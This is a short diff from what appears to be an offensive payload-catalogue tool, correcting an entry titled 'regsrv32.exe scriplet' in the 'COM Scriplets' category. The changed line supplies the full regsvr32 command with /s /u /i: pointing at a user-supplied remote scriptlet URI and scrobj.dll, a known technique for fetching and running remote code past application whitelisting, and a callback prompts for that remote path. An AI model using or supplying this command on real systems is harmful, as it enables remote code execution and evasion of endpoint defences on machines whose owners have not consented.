@@ -231,7 +231,7 @@ Load({
 
 Load({
 	title: "regsrv32.exe scriplet",
-	payload: 'regsvr32.exe <PROMPT (Full URI to scriplet)> scrobj.dll',
+	payload: 'regsvr32.exe /s /u /i:<PROMPT (Full URI to scriplet)> scrobj.dll',
 	category: "COM Scriplets",
 	callback: function(bro){
 	    question("Enter the full path to your remote COM scriplet: ")
